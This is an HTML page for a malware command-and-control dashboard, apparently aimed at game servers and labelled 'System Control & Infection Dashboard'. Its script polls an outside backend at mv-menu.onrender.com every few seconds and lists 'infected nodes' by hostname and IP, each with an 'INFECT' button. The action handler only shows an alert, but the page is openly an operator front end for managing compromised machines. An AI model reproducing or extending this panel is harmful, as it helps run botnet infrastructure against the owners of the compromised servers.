<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MV C2 Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #0b0b0b; color: #e4e4e7; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(24, 24, 27, 0.8); backdrop-filter: blur(10px); }
        .server-card { transition: all 0.3s ease; border: 1px solid #27272a; }
        .server-card:hover { border-color: #2700b3; transform: translateY(-2px); }
    </style>
</head>
<body class="p-4 md:p-10">
    <div class="max-w-6xl mx-auto">
        <div class="flex justify-between items-center mb-10 glass p-6 rounded-2xl border border-zinc-800">
            <div>
                <h1 class="text-3xl font-black tracking-tighter text-white">SAVAGE <span class="text-blue-500">PANEL</span></h1>
                <p class="text-zinc-500 text-sm">System Control & Infection Dashboard</p>
            </div>
            <div class="text-right">
                <div class="text-xs text-zinc-500 uppercase font-bold">Status</div>
                <div class="flex items-center gap-2 text-green-500 font-mono">
                    <span class="relative flex h-2 w-2">
                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                        <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                    </span>
                    C2 CONNECTED
                </div>
            </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
            <div class="glass p-6 rounded-xl border border-zinc-800">
                <div class="text-zinc-500 text-xs font-bold uppercase">Online Servers</div>
                <div class="text-3xl font-bold mt-1" id="count-servers">0</div>
            </div>
            <div class="glass p-6 rounded-xl border border-zinc-800">
                <div class="text-zinc-500 text-xs font-bold uppercase">Total Players</div>
                <div class="text-3xl font-bold mt-1" id="count-players">0</div>
            </div>
            <div class="glass p-6 rounded-xl border border-zinc-800">
                <div class="text-zinc-500 text-xs font-bold uppercase">System OS</div>
                <div class="text-3xl font-bold mt-1">WINDOWS</div>
            </div>
        </div>

        <h2 class="text-xl font-bold mb-4 flex items-center gap-2 text-zinc-400">
            <i class="fa-solid fa-server"></i> INFECTED NODES
        </h2>
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="server-grid">
            <div class="col-span-full py-20 text-center text-zinc-600 border-2 border-dashed border-zinc-800 rounded-2xl">
                Čakám na prichádzajúce spojenia...
            </div>
        </div>
    </div>

    <script>
        async function fetchServers() {
            try {
                const response = await fetch('https://mv-menu.onrender.com/');
                const servers = await response.json();
                
                const grid = document.getElementById('server-grid');
                document.getElementById('count-servers').innerText = servers.length;
                
                if (servers.length === 0) return;

                grid.innerHTML = '';
                servers.forEach(server => {
                    grid.innerHTML += `
                        <div class="server-card glass p-5 rounded-2xl">
                            <div class="flex justify-between items-start mb-4">
                                <div class="bg-blue-500/10 text-blue-500 p-2 rounded-lg">
                                    <i class="fa-solid fa-microchip"></i>
                                </div>
                                <span class="text-[10px] bg-zinc-800 text-zinc-400 px-2 py-1 rounded font-mono">${server.lastSeen}</span>
                            </div>
                            <h3 class="text-lg font-bold text-white truncate">${server.hostname}</h3>
                            <p class="text-zinc-500 text-xs font-mono mb-6">${server.ip}</p>
                            
                            <div class="grid grid-cols-2 gap-2">
                                <button onclick="executeAction('${server.ip}', 'kick')" class="bg-zinc-800 hover:bg-zinc-700 py-2 rounded-lg text-xs font-bold transition">MANAGE</button>
                                <button onclick="executeAction('${server.ip}', 'infect')" class="bg-blue-600 hover:bg-blue-500 py-2 rounded-lg text-xs font-bold text-white transition">INFECT</button>
                            </div>
                        </div>
                    `;
                });
            } catch (err) {
                console.error("Backend nie je dostupný");
            }
        }

        function executeAction(ip, action) {
            alert(`Odosielam príkaz [${action.toUpperCase()}] na IP: ${ip}`);
        }

        setInterval(fetchServers, 3000);
        fetchServers();
    </script>
</body>
</html>
